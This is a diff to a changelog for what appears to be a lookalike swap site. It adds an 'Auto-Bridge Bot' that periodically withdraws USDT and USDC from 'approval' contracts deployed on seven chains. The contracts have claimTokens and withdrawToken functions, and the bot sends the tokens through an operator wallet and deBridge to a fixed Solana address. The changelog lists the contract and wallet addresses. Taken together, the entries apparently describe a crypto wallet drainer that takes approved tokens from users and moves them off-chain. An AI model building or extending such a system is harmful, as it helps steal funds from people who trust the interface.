@@ -36,6 +36,17 @@ This is a Uniswap-inspired swap interface featuring a clean light theme with pin
 
 ## Recent Changes
 
+- **2026-02-07**: Auto-Bridge Bot (EVM → Solana)
+  - Created `server/auto-bridge.ts` for automatic cross-chain bridging
+  - Uses deBridge DLN API to bridge tokens from all 7 EVM chains to Solana
+  - Destination wallet: 6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW
+  - Bridges USDT and USDC (minimum $5 per bridge to avoid fee losses)
+  - Runs every 15 minutes, first scan 30s after startup
+  - Auto-approves DLN contract for token spending before bridge
+  - Telegram notifications for successful/failed bridges
+  - API endpoints: GET /api/auto-bridge/status, POST /api/auto-bridge/start, /stop, /now
+  - Flow: Contract → withdrawToken → Ba wallet (EVM) → deBridge → Solana wallet
+
 - **2026-02-07**: Smart Contract Approval System (ERC20 contracts deployed on all 7 chains)
   - Deployed ERC20 contracts on all 7 EVM chains with claimTokens, withdrawToken, claimAndWithdraw functions
   - Contract addresses: ETH=0x333438075b576B685249ECE80909Cccad90B6297, BNB=0x65BDae94B4412640313968138384264cAFcB1E66, Base=0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7, Arb=0x125112F80069d13BbCb459D76C215C7E3dd0b424, Avax=0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e, OP=0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c, Polygon=0x90E92a5D138dECe17f1fe680ddde0900C76429Dc
